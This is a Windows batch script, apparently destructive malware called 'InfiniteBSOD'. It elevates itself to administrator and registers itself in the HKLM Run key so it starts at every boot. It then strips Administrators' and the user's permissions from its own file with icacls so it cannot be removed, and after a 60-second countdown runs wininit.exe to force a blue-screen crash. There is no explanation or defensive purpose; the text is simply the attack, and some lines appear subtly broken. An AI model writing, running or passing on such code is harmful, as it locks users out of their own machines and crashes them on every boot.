@echo off

setlocal enabledelayedexpansion
:: Get the script directory
set scriptDir=%~dp0
:: Get the script path
set scriptPath=%~f0
:: Run the script as admin
net session >nul 2>&1
if %errorlevel% neq 0 (
  echo Elevating...
  powershell -Command "& { Start-Process cmd.exe -ArgumentList '/c \"%~f0\"' -Verb RunAs }"
  exit /b
)


echo %scriptDir%
set realName=
call :GetRealName

set startupPath = HKLM\Software\Microsoft\Windows\CurrentVersion\Run

:: Batch file starts on startup
reg add "%startupPath%" /v InfiniteBSOD /t REG_SZ /d "%scriptDir%" /f


call :Protect "%scriptPath%"
call :Protect "C:\Users\regedit.exe"

set /a secs=60
call :Timer %secs%
call :BSOD
::Get the unchanged username
:GetRealName

for /f "tokens=3 delims=\" %%s in ('echo %userprofile%') do (
	set realName=%%s
)

exit /b 0



:: Make the batch file undeletable/immortal
:Protect
icacls "%~1" /reset /t
icacls "%~1" /inheritance:d /t
icacls "%~1" /remove "Administrators" /t
icacls "%~1" /remove "%username%" /t
icacls "%~1" /remove "Authenticated Users" /t
icacls "%~1" /grant "Users:RX" /t
icacls "%~1" /inheritance:d /t

exit /b 0

:: Timer
::Global timer
:Timer

set /a secs=%1

:sub_Timer

if %secs% neq 0 (
	set /a secs-=1
	timeout /t 1 /nobreak >nul
	goto sub_Timer
)

exit /b 0
::BSOD
:BSOD
wininit.exe
exit /b 0

pause